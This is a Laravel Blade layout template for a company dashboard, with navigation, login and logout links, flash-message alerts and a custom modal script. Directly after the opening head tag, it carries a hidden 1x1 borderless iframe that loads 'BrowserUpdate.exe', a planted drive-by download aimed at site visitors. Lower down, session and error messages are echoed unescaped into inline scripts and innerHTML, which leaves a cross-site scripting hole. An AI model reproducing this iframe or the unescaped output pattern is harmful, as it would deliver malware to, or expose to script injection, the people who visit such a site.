<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>{{ config('app.name', 'Laravel') }} :: Company</title>

    <!-- Scripts -->
	<script src="{{ asset('js/app.js') }}" defer></script>

    <!-- Fonts -->
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet" type="text/css">

    <!-- Font Awesome -->
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

    <!-- Styles -->
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link href="{{ asset('css/custom_modal.css') }}" rel="stylesheet">
</head>
<body>
<div id="app">
    <nav class="navbar navbar-expand-md navbar-light bg-white shadow-sm">
        <div class="container">
            <a class="navbar-brand" href="{{ route('company.dashboard') }}">
                {{ config('app.name', 'Laravel') }} :: Company
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="{{ __('Toggle navigation') }}">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <!-- Left Side Of Navbar -->
                <ul class="navbar-nav mr-auto">

                </ul>

                <!-- Right Side Of Navbar -->
                <ul class="navbar-nav ml-auto">
                    <!-- Authentication Links -->
                    @if (Auth::guard('company')->guest())
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('company.login') }}">{{ __('Login') }}</a>
                        </li>
                        @if (Route::has('company.register'))
                            <li class="nav-item">
                                <a class="nav-link" href="{{ route('company.register') }}">{{ __('Register') }}</a>
                            </li>
                        @endif
                    @else
                        <li class="nav-item dropdown">
                            <a id="navbarDropdown" class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" v-pre>
                                {{ Auth::guard('company')->user()->name }} <span class="caret"></span>
                            </a>

                            <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
                                <a class="dropdown-item" href="{{ route('company.logout') }}"
                                   onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                    {{ __('Logout') }}
                                </a>

                                <form id="logout-form" action="{{ route('company.logout') }}" method="POST" style="display: none;">
                                    @csrf
                                </form>
                            </div>
                        </li>
                    @endguest
                </ul>
            </div>
        </div>
    </nav>

    <main class="py-4">
        <div class="container">
            @if (session('success'))
                <div class="alert alert-dismissible alert-success" role="alert">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    {{ session('success') }}
                </div>
            @endif
    
            @if (session('failure'))
                <div class="alert alert-dismissible alert-danger" role="alert">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    {{ session('failure') }}
                </div>
            @endif
            @if($errors->any())
                <div class="alert alert-dismissible alert-danger" role="alert">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    <ul>
                    @foreach($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                    </ul>
                </div>
            @endif
        </div>
        @yield('content')
    </main>
</div>

<div class="modal" id="custom-messenger">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h6 class="modal-title">Message</h6>
                <button type="button" class="close coloredClose closeCustomModal" data-dismiss="modal" aria-label="Close">
                    <i class="fa fa-window-close" aria-hidden="true"></i>
                </button>
            </div>
            <div class="modal-body">
                <p id="customMsg"></p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-danger closeCustomModal">Close</button>
            </div>
        </div>
    </div>
</div>

<script>
    function show_custom_alert(message) {
        // console.log(message);
        var custom_modal = document.getElementById('custom-messenger');
        var close_modal0 = document.getElementsByClassName("closeCustomModal")[0];
        var close_modal1 = document.getElementsByClassName("closeCustomModal")[1];
        var custom_message = document.getElementById('customMsg');
        var customMessageTracked = '';

        if(Array.isArray(message)){
            customMessageTracked = "<ul style='color: red;'>";
            for(let i=0; i<message.length; i++){
                customMessageTracked += "<li>"+ message[i] +"</li>";
            }

            // for(key in message){
            //     customMessageTracked += "<li>"+ message[key] +"</li>";
            // }
            customMessageTracked += "</ul>";
        } else {
            customMessageTracked = message;
        }

        custom_message.innerHTML = customMessageTracked;

        custom_modal.style.display = 'block';

        // When the user clicks on (x), close the modal
        close_modal0.onclick = function() {
            custom_modal.style.display = 'none';
        }

        // When the user clicks on close button, close the modal
        close_modal1.onclick = function() {
            custom_modal.style.display = 'none';
        }

        // When the user clicks anywhere outside of the modal, close it
        window.onclick = function(event) {
            if (event.target == custom_modal) {
                custom_modal.style.display = 'none';
            }
        }
    }
</script>

@if ( session('success') )
    @php
        $custom_message = session('success');
        echo "<script>show_custom_alert(`<span style=\"color: green\"><i class=\"fa fa-check\" aria-hidden=\"true\"></i> $custom_message</span>`)</script>";
    @endphp
@endif

@if ( session('failure') )
    @php
        $custom_message = session('failure');
        echo "<script>show_custom_alert(`<span style=\"color: red\"><i class=\"fa fa-times\" aria-hidden=\"true\"></i> $custom_message</span>`)</script>";
    @endphp
@endif

@if ( $errors->any() )
    @php $data = '<ul>' @endphp
    @foreach($errors->all() as $error)
        @php
            $data .= '<li>'. $error .'</li>'
        @endphp
    @endforeach
    @php $data .= '</ul>' @endphp

    @php
        echo "<script>show_custom_alert(`<span style=\"color: red\">$data</span>`)</script>";
    @endphp		
@endif

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
  crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>

@yield('scripts')

</body>
</html>